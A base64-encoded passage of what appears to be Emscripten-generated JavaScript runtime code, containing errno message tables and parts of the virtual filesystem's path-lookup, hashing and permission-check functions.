ToiQ29ubmVjdGlvbiByZXNldCBieSBwZWVyIiwxNjoiRmlsZSBsb2NraW5nIGRlYWRsb2NrIGVycm9yIiwxNzoiRGVzdGluYXRpb24gYWRkcmVzcyByZXF1aXJlZCIsMTg6Ik1hdGggYXJnIG91dCBvZiBkb21haW4gb2YgZnVuYyIsMTk6IlF1b3RhIGV4Y2VlZGVkIiwyMDoiRmlsZSBleGlzdHMiLDIxOiJCYWQgYWRkcmVzcyIsMjI6IkZpbGUgdG9vIGxhcmdlIiwyMzoiSG9zdCBpcyB1bnJlYWNoYWJsZSIsMjQ6IklkZW50aWZpZXIgcmVtb3ZlZCIsMjU6IklsbGVnYWwgYnl0ZSBzZXF1ZW5jZSIsMjY6IkNvbm5lY3Rpb24gYWxyZWFkeSBpbiBwcm9ncmVzcyIsMjc6IkludGVycnVwdGVkIHN5c3RlbSBjYWxsIiwyODoiSW52YWxpZCBhcmd1bWVudCIsMjk6IkkvTyBlcnJvciIsMzA6IlNvY2tldCBpcyBhbHJlYWR5IGNvbm5lY3RlZCIsMzE6IklzIGEgZGlyZWN0b3J5IiwzMjoiVG9vIG1hbnkgc3ltYm9saWMgbGlua3MiLDMzOiJUb28gbWFueSBvcGVuIGZpbGVzIiwzNDoiVG9vIG1hbnkgbGlua3MiLDM1OiJNZXNzYWdlIHRvbyBsb25nIiwzNjoiTXVsdGlob3AgYXR0ZW1wdGVkIiwzNzoiRmlsZSBvciBwYXRoIG5hbWUgdG9vIGxvbmciLDM4OiJOZXR3b3JrIGludGVyZmFjZSBpcyBub3QgY29uZmlndXJlZCIsMzk6IkNvbm5lY3Rpb24gcmVzZXQgYnkgbmV0d29yayIsNDA6Ik5ldHdvcmsgaXMgdW5yZWFjaGFibGUiLDQxOiJUb28gbWFueSBvcGVuIGZpbGVzIGluIHN5c3RlbSIsNDI6Ik5vIGJ1ZmZlciBzcGFjZSBhdmFpbGFibGUiLDQzOiJObyBzdWNoIGRldmljZSIsNDQ6Ik5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkiLDQ1OiJFeGVjIGZvcm1hdCBlcnJvciIsNDY6Ik5vIHJlY29yZCBsb2NrcyBhdmFpbGFibGUiLDQ3OiJUaGUgbGluayBoYXMgYmVlbiBzZXZlcmVkIiw0ODoiTm90IGVub3VnaCBjb3JlIiw0OToiTm8gbWVzc2FnZSBvZiBkZXNpcmVkIHR5cGUiLDUwOiJQcm90b2NvbCBub3QgYXZhaWxhYmxlIiw1MToiTm8gc3BhY2UgbGVmdCBvbiBkZXZpY2UiLDUyOiJGdW5jdGlvbiBub3QgaW1wbGVtZW50ZWQiLDUzOiJTb2NrZXQgaXMgbm90IGNvbm5lY3RlZCIsNTQ6Ik5vdCBhIGRpcmVjdG9yeSIsNTU6IkRpcmVjdG9yeSBub3QgZW1wdHkiLDU2OiJTdGF0ZSBub3QgcmVjb3ZlcmFibGUiLDU3OiJTb2NrZXQgb3BlcmF0aW9uIG9uIG5vbi1zb2NrZXQiLDU5OiJOb3QgYSB0eXBld3JpdGVyIiw2MDoiTm8gc3VjaCBkZXZpY2Ugb3IgYWRkcmVzcyIsNjE6IlZhbHVlIHRvbyBsYXJnZSBmb3IgZGVmaW5lZCBkYXRhIHR5cGUiLDYyOiJQcmV2aW91cyBvd25lciBkaWVkIiw2MzoiTm90IHN1cGVyLXVzZXIiLDY0OiJCcm9rZW4gcGlwZSIsNjU6IlByb3RvY29sIGVycm9yIiw2NjoiVW5rbm93biBwcm90b2NvbCIsNjc6IlByb3RvY29sIHdyb25nIHR5cGUgZm9yIHNvY2tldCIsNjg6Ik1hdGggcmVzdWx0IG5vdCByZXByZXNlbnRhYmxlIiw2OToiUmVhZCBvbmx5IGZpbGUgc3lzdGVtIiw3MDoiSWxsZWdhbCBzZWVrIiw3MToiTm8gc3VjaCBwcm9jZXNzIiw3MjoiU3RhbGUgZmlsZSBoYW5kbGUiLDczOiJDb25uZWN0aW9uIHRpbWVkIG91dCIsNzQ6IlRleHQgZmlsZSBidXN5Iiw3NToiQ3Jvc3MtZGV2aWNlIGxpbmsiLDEwMDoiRGV2aWNlIG5vdCBhIHN0cmVhbSIsMTAxOiJCYWQgZm9udCBmaWxlIGZtdCIsMTAyOiJJbnZhbGlkIHNsb3QiLDEwMzoiSW52YWxpZCByZXF1ZXN0IGNvZGUiLDEwNDoiTm8gYW5vZGUiLDEwNToiQmxvY2sgZGV2aWNlIHJlcXVpcmVkIiwxMDY6IkNoYW5uZWwgbnVtYmVyIG91dCBvZiByYW5nZSIsMTA3OiJMZXZlbCAzIGhhbHRlZCIsMTA4OiJMZXZlbCAzIHJlc2V0IiwxMDk6IkxpbmsgbnVtYmVyIG91dCBvZiByYW5nZSIsMTEwOiJQcm90b2NvbCBkcml2ZXIgbm90IGF0dGFjaGVkIiwxMTE6Ik5vIENTSSBzdHJ1Y3R1cmUgYXZhaWxhYmxlIiwxMTI6IkxldmVsIDIgaGFsdGVkIiwxMTM6IkludmFsaWQgZXhjaGFuZ2UiLDExNDoiSW52YWxpZCByZXF1ZXN0IGRlc2NyaXB0b3IiLDExNToiRXhjaGFuZ2UgZnVsbCIsMTE2OiJObyBkYXRhIChmb3Igbm8gZGVsYXkgaW8pIiwxMTc6IlRpbWVyIGV4cGlyZWQiLDExODoiT3V0IG9mIHN0cmVhbXMgcmVzb3VyY2VzIiwxMTk6Ik1hY2hpbmUgaXMgbm90IG9uIHRoZSBuZXR3b3JrIiwxMjA6IlBhY2thZ2Ugbm90IGluc3RhbGxlZCIsMTIxOiJUaGUgb2JqZWN0IGlzIHJlbW90ZSIsMTIyOiJBZHZlcnRpc2UgZXJyb3IiLDEyMzoiU3Jtb3VudCBlcnJvciIsMTI0OiJDb21tdW5pY2F0aW9uIGVycm9yIG9uIHNlbmQiLDEyNToiQ3Jvc3MgbW91bnQgcG9pbnQgKG5vdCByZWFsbHkgZXJyb3IpIiwxMjY6IkdpdmVuIGxvZy4gbmFtZSBub3QgdW5pcXVlIiwxMjc6ImYuZC4gaW52YWxpZCBmb3IgdGhpcyBvcGVyYXRpb24iLDEyODoiUmVtb3RlIGFkZHJlc3MgY2hhbmdlZCIsMTI5OiJDYW4gICBhY2Nlc3MgYSBuZWVkZWQgc2hhcmVkIGxpYiIsMTMwOiJBY2Nlc3NpbmcgYSBjb3JydXB0ZWQgc2hhcmVkIGxpYiIsMTMxOiIubGliIHNlY3Rpb24gaW4gYS5vdXQgY29ycnVwdGVkIiwxMzI6IkF0dGVtcHRpbmcgdG8gbGluayBpbiB0b28gbWFueSBsaWJzIiwxMzM6IkF0dGVtcHRpbmcgdG8gZXhlYyBhIHNoYXJlZCBsaWJyYXJ5IiwxMzU6IlN0cmVhbXMgcGlwZSBlcnJvciIsMTM2OiJUb28gbWFueSB1c2VycyIsMTM3OiJTb2NrZXQgdHlwZSBub3Qgc3VwcG9ydGVkIiwxMzg6Ik5vdCBzdXBwb3J0ZWQiLDEzOToiUHJvdG9jb2wgZmFtaWx5IG5vdCBzdXBwb3J0ZWQiLDE0MDoiQ2FuJ3Qgc2VuZCBhZnRlciBzb2NrZXQgc2h1dGRvd24iLDE0MToiVG9vIG1hbnkgcmVmZXJlbmNlcyIsMTQyOiJIb3N0IGlzIGRvd24iLDE0ODoiTm8gbWVkaXVtIChpbiB0YXBlIGRyaXZlKSIsMTU2OiJMZXZlbCAyIG5vdCBzeW5jaHJvbml6ZWQifTsNCiAgDQogIHZhciBFUlJOT19DT0RFUz17RVBFUk06NjMsRU5PRU5UOjQ0LEVTUkNIOjcxLEVJTlRSOjI3LEVJTzoyOSxFTlhJTzo2MCxFMkJJRzoxLEVOT0VYRUM6NDUsRUJBREY6OCxFQ0hJTEQ6MTIsRUFHQUlOOjYsRVdPVUxEQkxPQ0s6NixFTk9NRU06NDgsRUFDQ0VTOjIsRUZBVUxUOjIxLEVOT1RCTEs6MTA1LEVCVVNZOjEwLEVFWElTVDoyMCxFWERFVjo3NSxFTk9ERVY6NDMsRU5PVERJUjo1NCxFSVNESVI6MzEsRUlOVkFMOjI4LEVORklMRTo0MSxFTUZJTEU6MzMsRU5PVFRZOjU5LEVUWFRCU1k6NzQsRUZCSUc6MjIsRU5PU1BDOjUxLEVTUElQRTo3MCxFUk9GUzo2OSxFTUxJTks6MzQsRVBJUEU6NjQsRURPTToxOCxFUkFOR0U6NjgsRU5PTVNHOjQ5LEVJRFJNOjI0LEVDSFJORzoxMDYsRUwyTlNZTkM6MTU2LEVMM0hMVDoxMDcsRUwzUlNUOjEwOCxFTE5STkc6MTA5LEVVTkFUQ0g6MTEwLEVOT0NTSToxMTEsRUwySExUOjExMixFREVBRExLOjE2LEVOT0xDSzo0NixFQkFERToxMTMsRUJBRFI6MTE0LEVYRlVMTDoxMTUsRU5PQU5POjEwNCxFQkFEUlFDOjEwMyxFQkFEU0xUOjEwMixFREVBRExPQ0s6MTYsRUJGT05UOjEwMSxFTk9TVFI6MTAwLEVOT0RBVEE6MTE2LEVUSU1FOjExNyxFTk9TUjoxMTgsRU5PTkVUOjExOSxFTk9QS0c6MTIwLEVSRU1PVEU6MTIxLEVOT0xJTks6NDcsRUFEVjoxMjIsRVNSTU5UOjEyMyxFQ09NTToxMjQsRVBST1RPOjY1LEVNVUxUSUhPUDozNixFRE9URE9UOjEyNSxFQkFETVNHOjksRU5PVFVOSVE6MTI2LEVCQURGRDoxMjcsRVJFTUNIRzoxMjgsRUxJQkFDQzoxMjksRUxJQkJBRDoxMzAsRUxJQlNDTjoxMzEsRUxJQk1BWDoxMzIsRUxJQkVYRUM6MTMzLEVOT1NZUzo1MixFTk9URU1QVFk6NTUsRU5BTUVUT09MT05HOjM3LEVMT09QOjMyLEVPUE5PVFNVUFA6MTM4LEVQRk5PU1VQUE9SVDoxMzksRUNPTk5SRVNFVDoxNSxFTk9CVUZTOjQyLEVBRk5PU1VQUE9SVDo1LEVQUk9UT1RZUEU6NjcsRU5PVFNPQ0s6NTcsRU5PUFJPVE9PUFQ6NTAsRVNIVVRET1dOOjE0MCxFQ09OTlJFRlVTRUQ6MTQsRUFERFJJTlVTRTozLEVDT05OQUJPUlRFRDoxMyxFTkVUVU5SRUFDSDo0MCxFTkVURE9XTjozOCxFVElNRURPVVQ6NzMsRUhPU1RET1dOOjE0MixFSE9TVFVOUkVBQ0g6MjMsRUlOUFJPR1JFU1M6MjYsRUFMUkVBRFk6NyxFREVTVEFERFJSRVE6MTcsRU1TR1NJWkU6MzUsRVBST1RPTk9TVVBQT1JUOjY2LEVTT0NLVE5PU1VQUE9SVDoxMzcsRUFERFJOT1RBVkFJTDo0LEVORVRSRVNFVDozOSxFSVNDT05OOjMwLEVOT1RDT05OOjUzLEVUT09NQU5ZUkVGUzoxNDEsRVVTRVJTOjEzNixFRFFVT1Q6MTksRVNUQUxFOjcyLEVOT1RTVVA6MTM4LEVOT01FRElVTToxNDgsRUlMU0VROjI1LEVPVkVSRkxPVzo2MSxFQ0FOQ0VMRUQ6MTEsRU5PVFJFQ09WRVJBQkxFOjU2LEVPV05FUkRFQUQ6NjIsRVNUUlBJUEU6MTM1fTt2YXIgRlM9e3Jvb3Q6bnVsbCxtb3VudHM6W10sZGV2aWNlczp7fSxzdHJlYW1zOltdLG5leHRJbm9kZToxLG5hbWVUYWJsZTpudWxsLGN1cnJlbnRQYXRoOiIvIixpbml0aWFsaXplZDpmYWxzZSxpZ25vcmVQZXJtaXNzaW9uczp0cnVlLHRyYWNraW5nRGVsZWdhdGU6e30sdHJhY2tpbmc6e29wZW5GbGFnczp7UkVBRDoxLFdSSVRFOjJ9fSxFcnJub0Vycm9yOm51bGwsZ2VuZXJpY0Vycm9yczp7fSxmaWxlc3lzdGVtczpudWxsLHN5bmNGU1JlcXVlc3RzOjAsaGFuZGxlRlNFcnJvcjpmdW5jdGlvbihlKSB7DQogICAgICAgIGlmICghKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgdGhyb3cgZSArICcgOiAnICsgc3RhY2tUcmFjZSgpOw0KICAgICAgICByZXR1cm4gc2V0RXJyTm8oZS5lcnJubyk7DQogICAgICB9LGxvb2t1cFBhdGg6ZnVuY3Rpb24ocGF0aCwgb3B0cykgew0KICAgICAgICBwYXRoID0gUEFUSF9GUy5yZXNvbHZlKEZTLmN3ZCgpLCBwYXRoKTsNCiAgICAgICAgb3B0cyA9IG9wdHMgfHwge307DQogIA0KICAgICAgICBpZiAoIXBhdGgpIHJldHVybiB7IHBhdGg6ICcnLCBub2RlOiBudWxsIH07DQogIA0KICAgICAgICB2YXIgZGVmYXVsdHMgPSB7DQogICAgICAgICAgZm9sbG93X21vdW50OiB0cnVlLA0KICAgICAgICAgIHJlY3Vyc2VfY291bnQ6IDANCiAgICAgICAgfTsNCiAgICAgICAgZm9yICh2YXIga2V5IGluIGRlZmF1bHRzKSB7DQogICAgICAgICAgaWYgKG9wdHNba2V5XSA9PT0gdW5kZWZpbmVkKSB7DQogICAgICAgICAgICBvcHRzW2tleV0gPSBkZWZhdWx0c1trZXldOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICANCiAgICAgICAgaWYgKG9wdHMucmVjdXJzZV9jb3VudCA+IDgpIHsgIC8vIG1heCByZWN1cnNpdmUgbG9va3VwIG9mIDgNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigzMik7DQogICAgICAgIH0NCiAgDQogICAgICAgIC8vIHNwbGl0IHRoZSBwYXRoDQogICAgICAgIHZhciBwYXJ0cyA9IFBBVEgubm9ybWFsaXplQXJyYXkocGF0aC5zcGxpdCgnLycpLmZpbHRlcihmdW5jdGlvbihwKSB7DQogICAgICAgICAgcmV0dXJuICEhcDsNCiAgICAgICAgfSksIGZhbHNlKTsNCiAgDQogICAgICAgIC8vIHN0YXJ0IGF0IHRoZSByb290DQogICAgICAgIHZhciBjdXJyZW50ID0gRlMucm9vdDsNCiAgICAgICAgdmFyIGN1cnJlbnRfcGF0aCA9ICcvJzsNCiAgDQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcGFydHMubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICB2YXIgaXNsYXN0ID0gKGkgPT09IHBhcnRzLmxlbmd0aC0xKTsNCiAgICAgICAgICBpZiAoaXNsYXN0ICYmIG9wdHMucGFyZW50KSB7DQogICAgICAgICAgICAvLyBzdG9wIHJlc29sdmluZw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICBjdXJyZW50ID0gRlMubG9va3VwTm9kZShjdXJyZW50LCBwYXJ0c1tpXSk7DQogICAgICAgICAgY3VycmVudF9wYXRoID0gUEFUSC5qb2luMihjdXJyZW50X3BhdGgsIHBhcnRzW2ldKTsNCiAgDQogICAgICAgICAgLy8ganVtcCB0byB0aGUgbW91bnQncyByb290IG5vZGUgaWYgdGhpcyBpcyBhIG1vdW50cG9pbnQNCiAgICAgICAgICBpZiAoRlMuaXNNb3VudHBvaW50KGN1cnJlbnQpKSB7DQogICAgICAgICAgICBpZiAoIWlzbGFzdCB8fCAoaXNsYXN0ICYmIG9wdHMuZm9sbG93X21vdW50KSkgew0KICAgICAgICAgICAgICBjdXJyZW50ID0gY3VycmVudC5tb3VudGVkLnJvb3Q7DQogICAgICAgICAgICB9DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICAvLyBieSBkZWZhdWx0LCBsb29rdXBQYXRoIHdpbGwgbm90IGZvbGxvdyBhIHN5bWxpbmsgaWYgaXQgaXMgdGhlIGZpbmFsIHBhdGggY29tcG9uZW50Lg0KICAgICAgICAgIC8vIHNldHRpbmcgb3B0cy5mb2xsb3cgPSB0cnVlIHdpbGwgb3ZlcnJpZGUgdGhpcyBiZWhhdmlvci4NCiAgICAgICAgICBpZiAoIWlzbGFzdCB8fCBvcHRzLmZvbGxvdykgew0KICAgICAgICAgICAgdmFyIGNvdW50ID0gMDsNCiAgICAgICAgICAgIHdoaWxlIChGUy5pc0xpbmsoY3VycmVudC5tb2RlKSkgew0KICAgICAgICAgICAgICB2YXIgbGluayA9IEZTLnJlYWRsaW5rKGN1cnJlbnRfcGF0aCk7DQogICAgICAgICAgICAgIGN1cnJlbnRfcGF0aCA9IFBBVEhfRlMucmVzb2x2ZShQQVRILmRpcm5hbWUoY3VycmVudF9wYXRoKSwgbGluayk7DQogIA0KICAgICAgICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChjdXJyZW50X3BhdGgsIHsgcmVjdXJzZV9jb3VudDogb3B0cy5yZWN1cnNlX2NvdW50IH0pOw0KICAgICAgICAgICAgICBjdXJyZW50ID0gbG9va3VwLm5vZGU7DQogIA0KICAgICAgICAgICAgICBpZiAoY291bnQrKyA+IDQwKSB7ICAvLyBsaW1pdCBtYXggY29uc2VjdXRpdmUgc3ltbGlua3MgdG8gNDAgKFNZTUxPT1BfTUFYKS4NCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigzMik7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgDQogICAgICAgIHJldHVybiB7IHBhdGg6IGN1cnJlbnRfcGF0aCwgbm9kZTogY3VycmVudCB9Ow0KICAgICAgfSxnZXRQYXRoOmZ1bmN0aW9uKG5vZGUpIHsNCiAgICAgICAgdmFyIHBhdGg7DQogICAgICAgIHdoaWxlICh0cnVlKSB7DQogICAgICAgICAgaWYgKEZTLmlzUm9vdChub2RlKSkgew0KICAgICAgICAgICAgdmFyIG1vdW50ID0gbm9kZS5tb3VudC5tb3VudHBvaW50Ow0KICAgICAgICAgICAgaWYgKCFwYXRoKSByZXR1cm4gbW91bnQ7DQogICAgICAgICAgICByZXR1cm4gbW91bnRbbW91bnQubGVuZ3RoLTFdICE9PSAnLycgPyBtb3VudCArICcvJyArIHBhdGggOiBtb3VudCArIHBhdGg7DQogICAgICAgICAgfQ0KICAgICAgICAgIHBhdGggPSBwYXRoID8gbm9kZS5uYW1lICsgJy8nICsgcGF0aCA6IG5vZGUubmFtZTsNCiAgICAgICAgICBub2RlID0gbm9kZS5wYXJlbnQ7DQogICAgICAgIH0NCiAgICAgIH0saGFzaE5hbWU6ZnVuY3Rpb24ocGFyZW50aWQsIG5hbWUpIHsNCiAgICAgICAgdmFyIGhhc2ggPSAwOw0KICANCiAgDQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbmFtZS5sZW5ndGg7IGkrKykgew0KICAgICAgICAgIGhhc2ggPSAoKGhhc2ggPDwgNSkgLSBoYXNoICsgbmFtZS5jaGFyQ29kZUF0KGkpKSB8IDA7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICgocGFyZW50aWQgKyBoYXNoKSA+Pj4gMCkgJSBGUy5uYW1lVGFibGUubGVuZ3RoOw0KICAgICAgfSxoYXNoQWRkTm9kZTpmdW5jdGlvbihub2RlKSB7DQogICAgICAgIHZhciBoYXNoID0gRlMuaGFzaE5hbWUobm9kZS5wYXJlbnQuaWQsIG5vZGUubmFtZSk7DQogICAgICAgIG5vZGUubmFtZV9uZXh0ID0gRlMubmFtZVRhYmxlW2hhc2hdOw0KICAgICAgICBGUy5uYW1lVGFibGVbaGFzaF0gPSBub2RlOw0KICAgICAgfSxoYXNoUmVtb3ZlTm9kZTpmdW5jdGlvbihub2RlKSB7DQogICAgICAgIHZhciBoYXNoID0gRlMuaGFzaE5hbWUobm9kZS5wYXJlbnQuaWQsIG5vZGUubmFtZSk7DQogICAgICAgIGlmIChGUy5uYW1lVGFibGVbaGFzaF0gPT09IG5vZGUpIHsNCiAgICAgICAgICBGUy5uYW1lVGFibGVbaGFzaF0gPSBub2RlLm5hbWVfbmV4dDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICB2YXIgY3VycmVudCA9IEZTLm5hbWVUYWJsZVtoYXNoXTsNCiAgICAgICAgICB3aGlsZSAoY3VycmVudCkgew0KICAgICAgICAgICAgaWYgKGN1cnJlbnQubmFtZV9uZXh0ID09PSBub2RlKSB7DQogICAgICAgICAgICAgIGN1cnJlbnQubmFtZV9uZXh0ID0gbm9kZS5uYW1lX25leHQ7DQogICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY3VycmVudCA9IGN1cnJlbnQubmFtZV9uZXh0Ow0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfSxsb29rdXBOb2RlOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgew0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm1heUxvb2t1cChwYXJlbnQpOw0KICAgICAgICBpZiAoZXJyQ29kZSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVyckNvZGUsIHBhcmVudCk7DQogICAgICAgIH0NCiAgICAgICAgdmFyIGhhc2ggPSBGUy5oYXNoTmFtZShwYXJlbnQuaWQsIG5hbWUpOw0KICAgICAgICBmb3IgKHZhciBub2RlID0gRlMubmFtZVRhYmxlW2hhc2hdOyBub2RlOyBub2RlID0gbm9kZS5uYW1lX25leHQpIHsNCiAgICAgICAgICB2YXIgbm9kZU5hbWUgPSBub2RlLm5hbWU7DQogICAgICAgICAgaWYgKG5vZGUucGFyZW50LmlkID09PSBwYXJlbnQuaWQgJiYgbm9kZU5hbWUgPT09IG5hbWUpIHsNCiAgICAgICAgICAgIHJldHVybiBub2RlOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAvLyBpZiB3ZSBmYWlsZWQgdG8gZmluZCBpdCBpbiB0aGUgY2FjaGUsIGNhbGwgaW50byB0aGUgVkZTDQogICAgICAgIHJldHVybiBGUy5sb29rdXAocGFyZW50LCBuYW1lKTsNCiAgICAgIH0sY3JlYXRlTm9kZTpmdW5jdGlvbihwYXJlbnQsIG5hbWUsIG1vZGUsIHJkZXYpIHsNCiAgICAgICAgdmFyIG5vZGUgPSBuZXcgRlMuRlNOb2RlKHBhcmVudCwgbmFtZSwgbW9kZSwgcmRldik7DQogIA0KICAgICAgICBGUy5oYXNoQWRkTm9kZShub2RlKTsNCiAgDQogICAgICAgIHJldHVybiBub2RlOw0KICAgICAgfSxkZXN0cm95Tm9kZTpmdW5jdGlvbihub2RlKSB7DQogICAgICAgIEZTLmhhc2hSZW1vdmVOb2RlKG5vZGUpOw0KICAgICAgfSxpc1Jvb3Q6ZnVuY3Rpb24obm9kZSkgew0KICAgICAgICByZXR1cm4gbm9kZSA9PT0gbm9kZS5wYXJlbnQ7DQogICAgICB9LGlzTW91bnRwb2ludDpmdW5jdGlvbihub2RlKSB7DQogICAgICAgIHJldHVybiAhIW5vZGUubW91bnRlZDsNCiAgICAgIH0saXNGaWxlOmZ1bmN0aW9uKG1vZGUpIHsNCiAgICAgICAgcmV0dXJuIChtb2RlICYgNjE0NDApID09PSAzMjc2ODsNCiAgICAgIH0saXNEaXI6ZnVuY3Rpb24obW9kZSkgew0KICAgICAgICByZXR1cm4gKG1vZGUgJiA2MTQ0MCkgPT09IDE2Mzg0Ow0KICAgICAgfSxpc0xpbms6ZnVuY3Rpb24obW9kZSkgew0KICAgICAgICByZXR1cm4gKG1vZGUgJiA2MTQ0MCkgPT09IDQwOTYwOw0KICAgICAgfSxpc0NocmRldjpmdW5jdGlvbihtb2RlKSB7DQogICAgICAgIHJldHVybiAobW9kZSAmIDYxNDQwKSA9PT0gODE5MjsNCiAgICAgIH0saXNCbGtkZXY6ZnVuY3Rpb24obW9kZSkgew0KICAgICAgICByZXR1cm4gKG1vZGUgJiA2MTQ0MCkgPT09IDI0NTc2Ow0KICAgICAgfSxpc0ZJRk86ZnVuY3Rpb24obW9kZSkgew0KICAgICAgICByZXR1cm4gKG1vZGUgJiA2MTQ0MCkgPT09IDQwOTY7DQogICAgICB9LGlzU29ja2V0OmZ1bmN0aW9uKG1vZGUpIHsNCiAgICAgICAgcmV0dXJuIChtb2RlICYgNDkxNTIpID09PSA0OTE1MjsNCiAgICAgIH0sZmxhZ01vZGVzOnsiciI6MCwicnMiOjEwNTI2NzIsInIrIjoyLCJ3Ijo1NzcsInd4Ijo3MDUsInh3Ijo3MDUsIncrIjo1NzgsInd4KyI6NzA2LCJ4dysiOjcwNiwiYSI6MTA4OSwiYXgiOjEyMTcsInhhIjoxMjE3LCJhKyI6MTA5MCwiYXgrIjoxMjE4LCJ4YSsiOjEyMTh9LG1vZGVTdHJpbmdUb0ZsYWdzOmZ1bmN0aW9uKHN0cikgew0KICAgICAgICB2YXIgZmxhZ3MgPSBGUy5mbGFnTW9kZXNbc3RyXTsNCiAgICAgICAgaWYgKHR5cGVvZiBmbGFncyA9PT0gJ3VuZGVmaW5lZCcpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ1Vua25vd24gZmlsZSBvcGVuIG1vZGU6ICcgKyBzdHIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmbGFnczsNCiAgICAgIH0sZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmc6ZnVuY3Rpb24oZmxhZykgew0KICAgICAgICB2YXIgcGVybXMgPSBbJ3InLCAndycsICdydyddW2ZsYWcgJiAzXTsNCiAgICAgICAgaWYgKChmbGFnICYgNTEyKSkgew0KICAgICAgICAgIHBlcm1zICs9ICd3JzsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcGVybXM7DQogICAgICB9LG5vZGVQZXJtaXNzaW9uczpmdW5jdGlvbihub2RlLCBwZXJtcykgew0KICAgICAgICBpZiAoRlMuaWdub3JlUGVybWlzc2lvbnMpIHsNCiAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgfQ0KICAgICAgICAvLyByZXR1cm4gMCBpZiBhbnkgdXNlciwgZ3JvdXAgb3Igb3duZXIgYml0cyBhcmUgc2V0Lg0KICAgICAgICBpZiAocGVybXMuaW5kZXhPZigncicpICE9PSAtMSAmJiAhKG5vZGUubW9kZSAmIDI5MikpIHsNCiAgICAgICAgICByZXR1cm4gMjsNCiAgICAgICAgfSBlbHNlIGlmIChwZXJtcy5pbmRleE9mKCd3JykgIT09IC0xICYmICEobm9kZS5tb2RlICYgMTQ2KSkgew0KICAgICAgICAgIHJldHVybiAyOw0KICAgICAgICB9IGVsc2UgaWYgKHBlcm1zLmluZGV4T2YoJ3gnKSAhPT0gLTEgJiYgIShub2RlLm1vZGUgJiA3MykpIHsNCiAgICAgICAgICByZXR1cm4gMjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gMDsNCiAgICAgIH0sbWF5TG9va3VwOmZ1bmN0aW9uKGRpcikgew0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm5vZGVQZXJtaXNzaW9ucyhkaXIsICd4Jyk7DQogICAgICAgIGlmIChlcnJDb2RlKSByZXR1cm4gZXJyQ29kZTsNCiAgICAgICAgaWYgKCFkaXIubm9kZV9vcHMubG9va3VwKSByZXR1cm4gMjsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9LG1heUNyZWF0ZTpmdW5jdGlvbihkaXIsIG5hbWUpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICB2YXIgbm9kZSA9IEZTLmxvb2t1cE5vZGUoZGlyLCBuYW1lKTsNCiAgICAgICAgICByZXR1cm4gMjA7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gRlMubm9kZVBlcm1pc3Npb25zKGRpciwgJ3d4Jyk7DQogICAgICB9LG1heURlbGV0ZTpmdW5jdGlvbihkaXIsIG5hbWUsIGlzZGlyKSB7DQogICAgICAgIHZhciBub2RlOw0KICAgICAgICB0cnkgew0KICAgICAgICAgIG5vZGUgPSBGUy5sb29rdXBOb2RlKGRpciwgbmFtZSk7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICByZXR1cm4gZS5lcnJubzsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm5vZGVQZXJtaXNzaW9ucyhkaXIsICd3eCcpOw0KICAgICAgICBpZiAoZXJyQ29kZSkgew0KICAgICAgICAgIHJldHVybiBlcnJDb2RlOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc2Rpcikgew0KICAgICAgICAgIGlmICghRlMuaXNEaXIobm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgcmV0dXJuIDU0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICBpZiAoRlMuaXNSb290KG5vZGUpIHx8IEZTLmdldFBhdGgobm9kZSkgPT09IEZTLmN3ZCgpKSB7DQogICAgICAgICAgICByZXR1cm4gMTA7DQogICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIGlmIChGUy5pc0Rpcihub2RlLm1vZGUpKSB7DQogICAgICAgICAgICByZXR1cm4gMzE7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfSxtYXlPcGVuOmZ1bmN0aW9uKG5vZGUsIGZsYWdzKSB7DQogICAgICAgIGlmICghbm9kZSkgew0KICAgICAgICAgIHJldHVybiA0NDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoRlMuaXNMaW5rKG5vZGUubW9kZSkpIHsNCiAgICAgICAgICByZXR1cm4gMzI7DQogICAgICAgIH0gZWxzZSBpZiAoRlMuaXNEaXIobm9kZS5tb2RlKSkgew0KICAgICAgICAgIGlmIChGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZyhmbGFncykgIT09ICdyJyB8fCAvLyBvcGVuaW5nIGZvciB3cml0ZQ0KICAgICAgICAgICAgICAoZmxhZ3MgJiA1MTIpKSB7